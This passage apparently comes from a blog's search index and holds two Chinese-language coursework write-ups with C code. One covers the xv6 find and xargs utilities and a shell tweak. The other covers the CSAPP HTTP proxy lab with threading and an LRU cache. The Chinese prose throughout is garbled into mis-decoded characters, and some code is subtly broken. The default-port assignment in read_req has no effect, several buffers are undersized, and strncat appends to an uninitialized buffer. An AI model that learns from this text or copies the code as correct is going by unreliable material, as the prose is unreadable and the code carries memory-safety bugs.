\u0026#34;.\u0026#34;) == 0 || strcmp(de.name, \u0026#34;..\u0026#34;) == 0) continue; memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; if(stat(buf, \u0026amp;st) \u0026lt; 0){ printf(\u0026#34;find: cannot stat %s\\n\u0026#34;, buf); continue; } find(buf, pattern); } break; } è€Œmatchå‡½æ•°éšä¾¿å†™ä¸€ä¸ªå­—ç¬¦ä¸²åŒ¹é…æˆ–è€…KMPç®—æ³•å³å¯ã€‚\nExtraï¼šfindæ”¯æŒæ­£åˆ™ ç»™äº†grep.cï¼Œç›´æ¥è°ƒæ¥å£\nLab1-5: xargs xargs commandå‘½ä»¤çš„å‚æ•°åŒæ ·æ˜¯shellæŒ‡ä»¤ï¼Œå®ƒè¯»å–stdoutä½œä¸ºå‚æ•°æŒ‡ä»¤çš„å‚æ•°ã€‚ç®€å•æ¥è¯´ï¼ŒxargsæŠŠå·¦è¾¹æŒ‡ä»¤çš„è¾“å‡ºæ”¾åˆ°æœ€å³è¾¹å½“ä½œè¾“å…¥ã€‚ä½†åœ¨æˆ‘ä»¬çš„å®ç°ä¸­ï¼Œè¿˜æœ‰è¯¸å¤šç»†èŠ‚ï¼š\nstdoutä¸­æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ä»¥\\nåˆ†å‰²ã€‚ç„¶è€Œè¿™é‡Œxv6å¹¶æ²¡æœ‰æ–¹ä¾¿çš„åº“å‡½æ•°è¯»å–ä¸€è¡Œè¾“å…¥ï¼Œéœ€è¦è‡ªå·±å®ç°readline() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int readline(char* buf) { char ch, line[MAXARG] = {0}; int bytesRead = 0; while (read(0, \u0026amp;ch, 1)) { // Read a char from stdout if (ch != \u0026#39;\\n\u0026#39;) { line[bytesRead++] = ch; if (bytesRead + 1 \u0026gt;= MAXARG) { printf(\u0026#34;xargs: line too long\\n\u0026#34;); return -1; } } else { // End of line if (bytesRead \u0026gt; 0) { line[bytesRead] = \u0026#39;\\0\u0026#39;; return 1; } } } return -1; } æ‰§è¡Œå­å‘½ä»¤ä½¿ç”¨fork+exec+wait 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int main(int argc, char *argv[]) { char buf[buf_size + 1] = {0}; char *xargv[MAXARG] = {0}; for (int i = 1; i \u0026lt; argc; i++) // å»æ‰xargs xargv[i - 1] = argv[i]; while (1) { int read_bytes = readline(buf); if (read_bytes \u0026lt;= 0) break; char xbuf[buf_size + 1] = {0}; memcpy(xbuf, buf, strlen(buf)); xargv[argc - 1] = xbuf; if (fork() == 0) { // in child if (exec(argv[1], xargv) \u0026lt; 0) { fprintf(2, \u0026#34;xargs: exec fails with -1\\n\u0026#34;); exit(1); } } else { int pid; wait(\u0026amp;pid); } } Extraï¼šè¿˜è¯´ğŸ”ªçš„äº‹ åœ¨å½“å‰å®ç°é‡Œï¼Œæ¯execä¸€ä¸ªshelléƒ½ä¼šæ‰“å°ä¸€ä¸ª$ï¼Œå¯¼è‡´è¿è¡Œtestè„šæœ¬æ—¶çš„è¾“å‡ºå®é™…ä¸Šæ˜¯ï¼š\n1 2 3 4 5 sh \u0026lt; xargstest.sh $ $ $ $ $ $ hello hello hello $ $ ä¸ºäº†æ¶ˆé™¤çƒ¦äººçš„$ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹shellæºç ï¼Œè®©å…¶åˆ¤æ–­æ˜¯å¦ä»æ–‡ä»¶ä¸­æ‰“å¼€ã€‚ç›¸å…³é€»è¾‘ä½äºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // user/sh.c:134 int getcmd(char *buf, int nbuf){ write(2, \u0026#34;$ \u0026#34;, 2); // åŠ å…¥åˆ¤æ–­é€»è¾‘ memset(buf, 0, nbuf); gets(buf, nbuf); if(buf[0] == 0) // EOF return -1; return 0; } int main(void){ static char buf[100]; int fd; // Ensure that three file descriptors are open. while((fd = open(\u0026#34;console\u0026#34;, O_RDWR)) \u0026gt;= 0){ if(fd \u0026gt;= 3){ close(fd); break; } } // Read and run input commands. while(getcmd(buf, sizeof(buf)) \u0026gt;= 0){ if(buf[0] == \u0026#39;c\u0026#39; \u0026amp;\u0026amp; buf[1] == \u0026#39;d\u0026#39; \u0026amp;\u0026amp; buf[2] == \u0026#39; \u0026#39;){ // Chdir must be called by the parent, not the child. buf[strlen(buf)-1] = 0; // chop \\n if(chdir(buf+3) \u0026lt; 0) fprintf(2, \u0026#34;cannot cd %s\\n\u0026#34;, buf+3); continue; } if(fork1() == 0) runcmd(parsecmd(buf)); wait(0); } exit(0); } åªéœ€è¦åŠ å…¥ä¸€ä¸ªçŠ¶æ€å˜é‡åˆ¤æ–­æ˜¯å¦ç»è¿‡forkå³å¯ã€‚\nLab1-E: Extraï¼šsh user/sh.cä½œä¸ºshellåŠŸèƒ½å¾ˆå—é™ï¼Œå¯ä»¥ä¸ºå…¶æ·»åŠ æ›´å¤šå¸¸ç”¨åŠŸèƒ½ï¼Œå¦‚ï¼š\næ”¯æŒwait æ”¯æŒ; æ”¯æŒå­shellï¼š(ï¼Œ) æ”¯æŒtabè‡ªåŠ¨è¡¥å…¨ æ”¯æŒhistory â€¦â€¦ è¯¦æƒ…è¯·å‚è€ƒã€ŠCSAPP-shellLabã€‹ï¼ŒğŸ‘´æ‡’å¾—å†™äº†ã€‚\nğŸ‘´å”¯ä¸€æƒ³å†™çš„å°±æ˜¯ç»™shellå¢åŠ ä¸€ä¸ªé€€å‡ºé”®ctrl+cæˆ–è€…è¯´å…³æœºé”®ï¼Œè¦ä¸ç„¶æ¯æ¬¡å¾—ä»å¤–é¢å…³é—­ç»ˆç«¯ï¼Œå¾ˆä¸ä¼˜é›…ã€‚\nä½†æ˜¯è¿™ä¸ªctrl+cå¯ä¸æ˜¯é‚£ä¹ˆå¥½æçš„ã€‚sh.cé‡Œåªèƒ½å¤„ç†ANSIIå­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ›´åº•å±‚çš„ç›‘å¬é”®ç›˜äº‹ä»¶çš„åº“ï¼Œä¹Ÿå°±æ˜¯é”®ç›˜é©±åŠ¨ã€‚ç„¶åå‘ç°æ ¹æœ¬æ²¡æœ‰é©±åŠ¨ï¼Œå¯èƒ½å­¦åˆ°IOé‚£ç« å°±ä¼šå†™é©±åŠ¨äº†å§ã€‚\nå®åœ¨ä¸è¡Œæˆ‘å†™ä¸ª\u0026quot;exit\u0026quot;æ€»å¯ä»¥å§ã€‚å¯ä»¥æ˜¯å¯ä»¥ï¼Œä½†æ˜¯ä¸ç®¡ç”¨ã€‚é€€å‡ºshä¼šæ— é™é‡å¯ã€‚\næœ€åğŸ‘´æŸ¥åˆ°å¯ä»¥ctrl+fï¼Œç„¶åæŒ‰aå°±èƒ½é€€å‡ºqemuäº†ã€‚ğŸ‘´é’ç»“ã€‚\næ‰“ä¸ªåˆ†â‘§ï¼š ","date":"2023-12-01T00:00:00Z","image":"https://lonelyuan.github.io/p/xv6-util/util-grade_hu29693ed85ff5987b48267af9c379c744_33770_120x120_fill_box_smart1_3.png","permalink":"https://lonelyuan.github.io/p/xv6-util/","title":"XV6 Lab - Utilities"},{"content":"æŒ‚æ¢¯å­æ¯ä¸ªäººéƒ½ç©è¿‡ï¼Œä½†ä½ çŸ¥é“æ¢¯å­çš„åŸç†å—ã€‚æœ€åä¸€ä¸ªlabï¼Œå®ç°ä¸€ä¸ªHTTPä»£ç†æœåŠ¡å™¨ã€‚æœ¬å®éªŒéš¾åº¦ç›¸å¯¹å‰é¢ä¸¤ä¸ªlabæœ‰æ‰€ä¸‹é™ï¼Œä½†ç»¼åˆæ€§æ¯”è¾ƒå¼ºï¼Œæ¶‰åŠæ•™ææœ€åä¸‰ç« çš„æ‰€æœ‰å†…å®¹ä»¥åŠmallocå’Œcacheä¸¤ä¸ªlabã€‚\né¡¹ç›®ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 . |-- csapp.c /* |-- csapp.h * è¿™ä¸‰ä¸ªæ–‡ä»¶æ˜¯é¡¹ç›®ä¸»ä½“ï¼Œå¯ä»¥éšæ„ä¿®æ”¹ |-- proxy.c */ |-- driver.sh # æµ‹è¯„è„šæœ¬ |-- free-port.sh /* |-- nop-server.py * å·¥å…·è„šæœ¬ |-- port-for-user.pl */ `-- tiny |-- cgi-bin/ # åŠ¨æ€ç¨‹åº |-- static/ # é™æ€æ–‡ä»¶ |-- csapp.c /* |-- csapp.h * è¯¾æœ¬ä¸­æåˆ°çš„tinyå®ç°ï¼Œå»ºè®®è¯¦ç»†é˜…è¯» `-- tiny.c */ csapp.c csapp.cå’Œcsapp.hæ˜¯è¯¾æœ¬åä¸‰ç« æåˆ°çš„å‡½æ•°ä»£ç å®ä¾‹ï¼ŒåŒ…æ‹¬ä»¥ä¸‹å‡ ç»„å‡½æ•°å®ç°ï¼š\nè¿›ç¨‹æ§åˆ¶ï¼šFork(),Execve(),Wait(),Kill(),Sleep(),Pause()\u0026hellip; ä¿¡å·æ§åˆ¶ï¼šSignal(),Sigprocmask(),Sig***set() I/Oæ“ä½œï¼šOpen(),Read(),Write(),Lseek(),Close()\u0026hellip; Signal-safe I/O Standard I/O Robust I/O ç›®å½•æ“ä½œï¼šOpendir(),Readdir(),Closedir() åŠ¨æ€å†…å­˜åˆ†é…ï¼šMalloc(),Realloc(),Calloc(),Free() å†…å­˜æ˜ å°„ï¼šMmap(),Nunmap() Socketæ¥å£ï¼šSocket(),Bind(),Listen(),Accept(),Connect() ç½‘ç»œä¿¡æ¯ï¼šGetaddrinfo(),Gethostbyname(),Inet_ntop()\u0026hellip; å¯é‡å…¥æ¥å£ï¼šOpen_clientfd(),Open_listenfd() Pthreadså¤šçº¿ç¨‹ï¼šcreate(),join(),cancel(),detach(),exit(),self(),once() POSIXä¿¡å·é‡ï¼šSem_init(),P(),V() è¿™ä¹Ÿå¤ªå¤šäº†8ã€‚å®é™…ä¸Šè¿™äº›éƒ½æ˜¯ç³»ç»Ÿå‡½æ•°çš„å°è£…ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦ç”¨åˆ°æ‰€æœ‰å‡½æ•°ã€‚å¯ä»¥çœ‹åˆ°ï¼Œæœ¬å®éªŒå°†åä¸‰ç« è®²è¿°çš„å†…å®¹å…¨éƒ¨æŠ›å‡ºï¼Œè®©æˆ‘ä»¬è‡ªå·±æ€è€ƒå¹¶é€‰ç”¨è¿™äº›å·¥å…·æ¥å®Œæˆç›®æ ‡ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥éšæ„ä¿®æ”¹è¿™äº›å°è£…æˆ–è€…ç›´æ¥ä½¿ç”¨ç³»ç»Ÿæ¥å£ã€‚\ntiny.c æ­¤å¤–ï¼Œtinyç›®å½•ä¸‹ä¹Ÿæœ‰ç›¸åŒçš„csapp.cå’Œcsapp.hï¼Œè€Œtiny.cæ˜¯è¯¾æœ¬ä¸Šæåˆ°çš„ç®€æ˜“webæœåŠ¡å™¨å®ç°ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å°†å…¶ä½œä¸ºproxyçš„åˆå§‹ä»£ç æ¡†æ¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int main(int argc, char **argv){ int listenfd, connfd; char hostname[MAXLINE], port[MAXLINE]; socklen_t clientlen; struct sockaddr_storage clientaddr; listenfd = Open_listenfd(argv[1]); while (1) { clientlen = sizeof(clientaddr); connfd = Accept(listenfd, (SA *)\u0026amp;clientaddr, \u0026amp;clientlen); Getnameinfo((SA *) \u0026amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, 0); printf(\u0026#34;Accepted from (%s, %s)\\n\u0026#34;, hostname, port); doit(connfd); Close(connfd); } } Socketæ¥å£æ˜¯ä¸€åˆ‡ç½‘ç»œç¨‹åºçš„åº•å±‚ï¼Œæœ‰å…³socketæ¨¡å‹è¯·éšä¾¿æœç´¢é‚£ä¸€å¼ æµç¨‹å›¾å¹¶ç†Ÿè®°äºå¿ƒï¼ˆæˆ–è€…å‚è€ƒğŸ‘´çš„æ–‡ç« ï¼‰ã€‚è¿™é‡Œç®€å•æ€»ç»“ä¸€ä¸‹è¦ç‚¹ï¼š\nåœ°å€æ ‡è®°ä¸»æœºï¼Œç«¯å£æ ‡è®°è¿›ç¨‹ã€‚ å®¢æˆ·ç«¯æ‰§è¡ŒConnect()ï¼ŒæœåŠ¡å™¨æ‰§è¡ŒBind(),Listen(),Accept()ã€‚ unixç³»ç»Ÿä¸­ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ‰“å¼€çš„æ–‡ä»¶é€šè¿‡æ–‡ä»¶æè¿°ç¬¦fdæ ‡è®°ã€‚ ç½‘ç»œè¿æ¥ä¹Ÿæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå³Socket()ä¹Ÿè¿”å›ä¸€ä¸ªfdã€‚ äºæ˜¯å¯¹è¯¥fdä½¿ç”¨ä¼ ç»ŸI/Oå‡½æ•°å³å¯è¿›è¡Œé€šä¿¡å†…å®¹çš„è¯»å†™ã€‚æœ¬è´¨ä¸Šå°±æ˜¯è¯»å†™Socketæä¾›çš„ç¼“å†²åŒº äºæ˜¯æœåŠ¡å™¨éœ€è¦ç»´æŠ¤listenfd,connfdä¸¤ä¸ªfdåˆ†åˆ«ä»£è¡¨ç›‘å¬ç«¯å£å’Œå®¢æˆ·ç«¯ç«¯å£ã€‚ è€ŒæœåŠ¡å™¨æ˜¯ä¸€ä¸ªéœ€è¦é•¿ä¹…è¿è¡Œçš„ç¨‹åºï¼Œå› æ­¤ä»–çš„æ ¸å¿ƒè¿›ç¨‹å¾€å¾€è¿è¡Œç€ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¹Ÿç§°ä¸ºä¸»äº‹ä»¶å¾ªç¯ã€‚ åœ¨å¾ªç¯ä¸­æœåŠ¡å™¨ä¸æ–­æ¥å—ç€å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œäºæ˜¯connfdåœ¨å¾ªç¯ä¸­ä¸æ–­åœ°åˆ›å»ºå’Œé”€æ¯ï¼Œè€Œlistenfdä¿æŒä¸å˜ã€‚ è€Œå…·ä½“åˆ°å•ä¸ªè¯·æ±‚çš„å¤„ç†ï¼Œtinyå°†å…¶äº¤ç»™äº†doit()å‡½æ•°ã€‚å…¶åŠŸèƒ½åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š\nä»ç¼“å†²åŒºä¸­è¯»å–HTTPæŠ¥æ–‡ tinyåªé’ˆå¯¹GETè¯·æ±‚åšå‡ºå“åº” è¯»ç¬¬ä¸€è¡Œï¼Œåˆ¤æ–­HTTPæ–¹æ³• è¯»å–å¤„ç†å‰©ä½™çš„HTTPé¦–éƒ¨ åˆ¤æ–­è¯·æ±‚çš„æ˜¯é™æ€æ–‡ä»¶è¿˜æ˜¯åŠ¨æ€ç¨‹åºï¼ˆcgi-binï¼‰ é™æ€è¯·æ±‚ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ åŠ¨æ€è¯·æ±‚ï¼Œè°ƒç”¨cgiç¨‹åº æ­¤å¤–ï¼Œé¢å¯¹é”™è¯¯æƒ…å†µè¦è¿”å›ç›¸åº”çš„çŠ¶æ€ç ï¼Œè€ŒæœåŠ¡å™¨è¿›ç¨‹ä¸èƒ½ç»“æŸã€‚ å¾—åˆ†ç‚¹ BasicCorrectness: 40 ï¼ˆåŸºæœ¬ä»£ç†ï¼‰ Concurrency: 15 ï¼ˆå¹¶å‘æ€§ï¼‰ Cache: 15 ï¼ˆä½¿ç”¨ç¼“å­˜ï¼‰ Part1: Basic Proxy proxyåœ¨clienté¢å‰æ‰®æ¼”æœåŠ¡å™¨ï¼Œåœ¨serveré¢å‰æ‰®æ¼”å®¢æˆ·ç«¯ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨proxyä¸­éœ€è¦åŒæ—¶å®ç°è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼Œè€Œtinyå·²ç»æœ‰äº†æœåŠ¡å™¨ç«¯çš„å®ç°ï¼Œæ•…è€Œåªéœ€è¦è€ƒè™‘å®¢æˆ·ç«¯çš„å®ç°å³å¯ã€‚\n1 2 3 4 5 â”Œâ”€â”€â”€â”€â”€â”€â” (2) â”Œâ”€â”€â”€â”€â”€â” (1) â”Œâ”€â”€â”€â”€â”€â”€â” â”‚ â”‚â—„â”€â”€â”€â”€â”€â”€â”¤ â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ â”‚Serverâ”‚ (3) â”‚Proxyâ”‚ (4) â”‚Clientâ”‚ â”‚ â”œâ”€â”€â”€â”€â”€â”€â–ºâ”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â–ºâ”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”˜ å…·ä½“æ¥è¯´ï¼Œåªéœ€è¦ä¿®æ”¹doitå‡½æ•°ã€‚é¦–å…ˆå»ºç«‹æœ€ç®€å•çš„æ¨¡å‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 // v0.1: score 16/40 void doit(int cfd){ char request[MAXLINE], host[16],port[5], response[MAXLINE]; /* (1) client -\u0026gt; proxy */ read_req(cfd, request, host, port); /* (2) proxy -\u0026gt; server */ int sfd = Open_clientfd(host, port); Rio_writen(sfd, request, strlen(request)); /* (3) server -\u0026gt; proxy */ read_res(sfd, response); /* (4) proxy -\u0026gt; client */ Rio_writen(cfd, response, strlen(response)); } read_req()å’Œread_res()å°è£…äº†ä»Rioç¼“å†²åŒºè¯»å–æŠ¥æ–‡çš„ç»†èŠ‚ã€‚ä¸‹é¢è¯¦ç»†ä»‹ç»ï¼š\nåœ¨clienté¢å‰æ‰®æ¼”server å¯¹äºè¯·æ±‚æŠ¥æ–‡ï¼Œé¦–å…ˆéœ€è¦è§£æå‡ºåœ°å€å’Œç«¯å£ä»¥ä¾¿æ‰¾åˆ°ç›®çš„æœåŠ¡å™¨ï¼Œå…¶æ¬¡éœ€è¦æ³¨æ„curl --proxyçš„ç¬¬ä¸€è¡Œå‘åŒ…ï¼š\n1 GET http://localhost:81/ HTTP/1.1 è¿™é‡Œè·¯å¾„å˜æˆäº†æœåŠ¡å™¨çš„å®Œæ•´åœ°å€ï¼Œç›´æ¥ä¸¢ç»™tinyæ˜¯ä¼šæŠ¥404çš„ã€‚å› æ­¤ï¼ŒğŸ‘´ç›´æ¥å¯¹ç¬¬ä¸€è¡Œæå–host,port,pathã€‚ï¼ˆæ³¨æ„åˆ†æ¸…sscanf()å’Œsprintf()ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void read_req(int fd, char* message, char* host, char* port, char* path){ rio_t rio; Rio_readinitb(\u0026amp;rio, fd); memset(message, 0, strlen(message)); char buf[MAXBUF], host_port_path[MAXLINE],host_port[MAXLINE], path_line[MAXLINE]; // Receive: \u0026#34;GET http://host:port/path HTTP/1.1\u0026#34; Rio_readlineb(\u0026amp;rio, buf, MAXLINE); sscanf(buf, \u0026#34;GET %s HTTP/1.1\\n\u0026#34;, host_port_path); sscanf(host_port_path, \u0026#34;http://%[^/]%s\u0026#34;, host_port, path); if(sscanf(host_port, \u0026#34;%[^:]:%s\u0026#34;, host, port) == 1) port = \u0026#34;80\u0026#34;; // Send: \u0026#34;GET /path HTTP/1.1\u0026#34; sprintf(path_line, \u0026#34;GET %s HTTP/1.1\\n\u0026#34;, path); strcat(message, path_line); while(strcmp(buf, \u0026#34;\\r\\n\u0026#34;)) { Rio_readlineb(\u0026amp;rio, buf, MAXLINE); strcat(message, buf); } } åœ¨serveré¢å‰æ‰®æ¼”client å¯¹äºå“åº”æŠ¥æ–‡ï¼Œåˆ™éœ€è¦è€ƒè™‘åŒ…ä½“é•¿åº¦é—®é¢˜ã€‚ä»£ç ä¸­è®¾ç½®äº†MAXBUFå¸¸é‡ä¸º8192ï¼Œåœ¨æµ‹è¯„è„šæœ¬ä¸­æœ‰å‡ ä¸ªæ ·ä¾‹æ˜¯è¿œè¶…è¿‡è¿™ä¸ªæ•°å­—çš„ã€‚å› æ­¤éœ€è¦è€ƒè™‘æµå¼ä¼ è¾“ï¼Œä¸€è¾¹æ¥å—ä¸€è¾¹å‘é€ã€‚äºæ˜¯doit()ä¹Ÿéœ€è¦è¿›è¡Œä¿®æ”¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // v0.2: score 40/40 void doit(int cfd){ char request[MAXLINE], host[16],port[5], res_buf[MAXBUF]; /* (1) client -\u0026gt; proxy */ read_req(cfd, request, host, port); /* (2) proxy -\u0026gt; server */ int sfd = Open_clientfd(host, port); Rio_writen(sfd, request, strlen(request)); /* (3) server -\u0026gt; proxy */ int n; while ((n = Rio_readn(sfd, res_buf, sizeof res_buf)) \u0026gt; 0) /* (4) proxy -\u0026gt; client */ Rio_writen(cfd, res_buf, n * sizeof(char)); } Part2: Concurrency åœ¨å¹¶å‘æ€§æµ‹è¯•ä¸­ï¼Œæµ‹è¯„è„šæœ¬ä¼šè°ƒç”¨nop-server.pyï¼Œå…¶æ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š\n1 2 3 4 5 serversocket.listen(5) while 1: channel, details = serversocket.accept() while 1: continue å¯ä»¥çœ‹åˆ°ï¼Œnop-serveråœ¨æ¥å—è¯·æ±‚ä¹‹åä¼šè¿›å…¥æ­»å¾ªç¯ï¼Œä¹Ÿå°±æ˜¯è¯´è¿æ¥è¢«æ°¸è¿œé˜»å¡äº†ã€‚è¿™è¦æ±‚proxyèƒ½å¤ŸåŒæ—¶æ¥å—å¤šä¸ªè¿æ¥ã€‚Pthreadåº“çš„å¤šçº¿ç¨‹æ¥å£è¾ƒä¸ºç®€å•ï¼Œåªéœ€è¦å°†ä¸»äº‹ä»¶å¾ªç¯ä¸­æ’å…¥Pthread_create()ï¼Œè€Œdoit()åˆ™è¢«å°è£…è¿›çº¿ç¨‹çš„å…¥å£å‡½æ•°ä¸­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 // v0.3 55/70 int main(){ // ... while (1) { // ... Pthread_create(\u0026amp;tid, NULL, thread, connfd); } } void thread(int fd){ Pthread_detach(pthread_self()); // è®¾ç½®ä¸ºå¯åˆ†ç¦»çŠ¶æ€ï¼Œè‡ªåŠ¨å›æ”¶èµ„æº doit(fd); Close(fd); } Part3: Cache åœ¨ç¼“å­˜æµ‹è¯•ä¸­ï¼Œæµ‹è¯„è„šæœ¬ä¼šåœ¨æ‰§è¡Œè¿‡ä¸€å®šçš„è¯·æ±‚ä¹‹åæ€æ­»tinyæœåŠ¡å™¨ï¼Œè¦æ±‚æœåŠ¡å™¨å¯¹ä¹‹å‰çš„è¯·æ±‚è¿›è¡Œä¿å­˜ã€‚ç»“åˆä¸Šä¸€æ­¥çš„å¤šçº¿ç¨‹ï¼Œè¿™é‡Œä¾¿å­˜åœ¨ç€å¹¶å‘è¯»å†™çš„é—®é¢˜ã€‚\nè€Œç¼“å­˜çš„å®ç°ç»†èŠ‚æœ‰éå¸¸å¤šå¯è¯´çš„éƒ¨åˆ†ï¼Œè¿™é‡Œé¦–å…ˆæŠ½è±¡å‡ºæ¥å£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // v0.4 70/70 void doit(int cfd) { char request[MAXLINE], host[MAXLINE],port[MAXLINE], path[MAXLINE], response[MAXLINE]; /* (1) client -\u0026gt; proxy */ read_req(cfd, request, host, port, path); /* (1.1) proxy -\u0026gt; cache */ char *value = read_cache(\u0026amp;cache, \u0026amp;path); if (value != NULL) { /* (1.2) cache -\u0026gt; client */ Rio_writen(cfd, value, strlen(value)); return; } /* (2) proxy -\u0026gt; server */ int n, sfd = Open_clientfd(host, port); Rio_writen(sfd, request, strlen(request)); /* (3) server -\u0026gt; proxy */ char buf[MAXBUF], res[MAX_CACHE_SIZE]; while ((n = Rio_readn(sfd, buf, sizeof buf)) \u0026gt; 0) { /* (4) proxy -\u0026gt; client */ Rio_writen(cfd, buf, n * sizeof(char)); strncat(res, buf, n * sizeof(char)); } /* (4.1) proxy -\u0026gt; cache */ write_cache(\u0026amp;cache, \u0026amp;path, res); Close(sfd); } å…·ä½“åˆ°ç¼“å­˜è®¾è®¡è¿™é‡Œå¯ä»¥è‡ªç”±å‘æŒ¥ã€‚å¦‚æœé¢å‘è¯„æµ‹è„šæœ¬ç¼–ç¨‹ï¼Œåªéœ€è¦ç¼“å­˜å®¹é‡ä¸º3ï¼Œè¿ç¼“å­˜åˆ é™¤çš„ç­–ç•¥éƒ½ä¸ç”¨å®ç°å°±å¯ä»¥æ»¡åˆ†ã€‚ä¸è¿‡è€ƒè¯•å°±è€ƒè¿™ä¸ªLRUã€OPTå•¥çš„ï¼Œè¿˜æ˜¯å¾—ç†è§£ä¸€ä¸‹ã€‚\nä¸‹é¢æ˜¯ğŸ‘´è®©gptå†™çš„åŸºäºå¾ªç¯é“¾è¡¨çš„LRUç­–ç•¥çš„ç¼“å­˜ç³»ç»Ÿï¼š\næ•°æ®ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 typedef struct CacheEntry { char* key; char* value; struct CacheEntry* next; struct CacheEntry* prev; } CacheEntry; typedef struct { int size; int capacity; CacheEntry* head; CacheEntry* tail; pthread_mutex_t lock; } Cache; åˆå§‹åŒ– 1 2 3 4 5 6 7 Cache* createCache(int capacity) { Cache* cache = (Cache*)malloc(sizeof(Cache)); cache-\u0026gt;size = 0; cache-\u0026gt;capacity = capacity; pthread_mutex_init(\u0026amp;cache-\u0026gt;lock, NULL); return cache; } è¯»ç¼“å­˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 char* read_cache(Cache* cache, const char* key) { pthread_mutex_lock(\u0026amp;cache-\u0026gt;lock); // æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ç›¸åŒçš„ key CacheEntry* current = cache-\u0026gt;head; while (current != NULL) { if (strcmp(current-\u0026gt;key, key) == 0) { pthread_mutex_unlock(\u0026amp;cache-\u0026gt;lock); return current-\u0026gt;value; } current = current-\u0026gt;next; } pthread_mutex_unlock(\u0026amp;cache-\u0026gt;lock); return NULL; } å†™ç¼“å­˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 void write_cache(Cache* cache, const char* key, const char* value) { // åˆå§‹åŒ–Entry CacheEntry* entry = (CacheEntry*)malloc(sizeof(CacheEntry)); entry-\u0026gt;key = strdup(key); entry-\u0026gt;value = strdup(value); entry-\u0026gt;next = NULL; entry-\u0026gt;prev = NULL; pthread_mutex_lock(\u0026amp;cache-\u0026gt;lock); // æŸ¥æ‰¾æ˜¯å¦å·²å­˜åœ¨ç›¸åŒçš„ key CacheEntry* current = cache-\u0026gt;head; while (current != NULL) { if (strcmp(current-\u0026gt;key, key) == 0) {// æ›´æ–°å€¼ free(current-\u0026gt;value); current-\u0026gt;value = strdup(value); pthread_mutex_unlock(\u0026amp;cache-\u0026gt;lock); return; } current = current-\u0026gt;next; } // æ’å…¥æ–°èŠ‚ç‚¹åˆ°é“¾è¡¨å¤´éƒ¨ entry-\u0026gt;next = cache-\u0026gt;head; if (cache-\u0026gt;head != NULL) { cache-\u0026gt;head-\u0026gt;prev = entry; } else { cache-\u0026gt;tail = entry; } cache-\u0026gt;head = entry; // å¦‚æœè¶…è¿‡å®¹é‡é™åˆ¶ï¼Œåˆ é™¤å°¾éƒ¨èŠ‚ç‚¹ if (cache-\u0026gt;size == cache-\u0026gt;capacity) { CacheEntry* tail = cache-\u0026gt;tail; cache-\u0026gt;tail = tail-\u0026gt;prev; cache-\u0026gt;tail-\u0026gt;next = NULL; free(tail-\u0026gt;key); free(tail-\u0026gt;value); free(tail); } else { cache-\u0026gt;size++; } pthread_mutex_unlock(\u0026amp;cache-\u0026gt;lock); } è¯„ä»·ï¼šæœ€åä¸€ä¸ªå®éªŒæ»¡åˆ†çš„è¦æ±‚è¿˜æ˜¯å¾ˆä½çš„ã€‚ç”±äºcè¯­è¨€ç¼–ç¨‹å®åœ¨ç¹çï¼ŒğŸ‘´è¿™ä¸ªå®éªŒè¿½æ±‚çš„æ˜¯æ»¡åˆ†å‰æä¸‹çš„ä»£ç æç®€ä¸»ä¹‰ã€‚\nç»“æŸäº†å— å®é™…ä¸Šï¼Œç”Ÿäº§çº§ä»£ç†æœåŠ¡å™¨éœ€è¦è€ƒè™‘çš„è¿œæ¯”æœ¬å®éªŒå¤æ‚å‡ ä¸ªæ•°é‡çº§ï¼Œåœ¨æ­¤æå‡ºå‡ ä¸ªæ€è·¯ä»¥æŠ›ç –å¼•ç‰ï¼š\nå®Œå¤‡çš„åè®®æ”¯æŒï¼š tinyä»…æ”¯æŒGETæ–¹æ³•ï¼Œä¸”ä¸æ”¯æŒè¯·æ±‚å¤´ï¼Œè¿™å®é™…ä¸Šæ˜¯è¢«ç§°ä¸ºHTTP 0.9çš„ä¸€ä¸ªå†å²ç‰ˆæœ¬ã€‚è€Œç›®å‰æœ€å¹¿æ³›ä½¿ç”¨çš„HTTP 